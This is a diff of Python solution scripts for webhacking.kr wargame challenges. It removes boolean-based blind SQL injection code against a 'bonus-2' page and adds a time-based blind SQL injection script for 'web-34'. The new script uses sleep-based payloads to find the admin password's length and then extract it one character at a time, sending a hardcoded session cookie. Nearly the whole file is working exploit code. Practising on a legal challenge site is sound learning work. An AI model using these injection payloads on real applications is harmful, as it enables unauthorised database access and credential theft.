@@ -1,43 +1,32 @@
-# import requests
-
-
-# cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
-
-
-# url="https://webhacking.kr/challenge/bonus-2/index.php"
-
-# data = {}
-
-# pw=""
-# for i in range(32):
-#     for j in range(33,127):
-        
-#         data['uuid']=f'admin\' and ascii(substr(pw,{str(i+1)},1))={str(j)} limit 1 #'
-       
-#         res=requests.post(url,cookies=cookies,data=data)
-#         if((res.text).find("Wrong password!")>0):
-#             print(pw)
-#             pw += chr(j)
-#             break
-            
-# print ("@@@@ pw :"+pw)
-# >> 6c9ca386a903921d7fa230ffa0ffc153
-# >> 60900386090392107002300000000153
-
 import requests
+import time
 
 cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
-url="https://webhacking.kr/challenge/bonus-2/index.php"
+url = "https://webhacking.kr/challenge/web-34/index.php"
 
-data = {}
-hx = [hex(i)[2:] for i in range(16)]
-pw = ''
-for i in range(32):
-    for j in range(16):
-        data['uuid']=f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}" #'
-        res = requests.post(url, data=data, cookies=cookies)
-        if res.text.find('Wrong password!') > 0:
-            pw += hx[j]
-            print(pw)
+pw_length = 0
+pw = []
+
+for i in range(40):
+    query = f"?msg=test&se=if(length(pw)={i},sleep(1),1)"
+    itime = time.time()
+    res = requests.get(url+query, cookies=cookies)
+    restime = time.time() - itime
+    if restime > 1:
+        pw_length = i
+        break
+    
+print(pw_length)
+
+for i in range(pw_length):
+    for j in range(33, 127):
+        query = f"?msg=test&se=if(ascii(substr(pw,{str(i+1)},1))={str(j)},sleep(1),1)"
+        itime = time.time()
+        res = requests.get(url+query, cookies=cookies)
+        restime = time.time() - itime
+        if restime > 1:
+            pw.append(chr(j))
+            print(''.join(pw))
             break
-print(f'password hash: {pw}')
+
+print(''.join(pw))
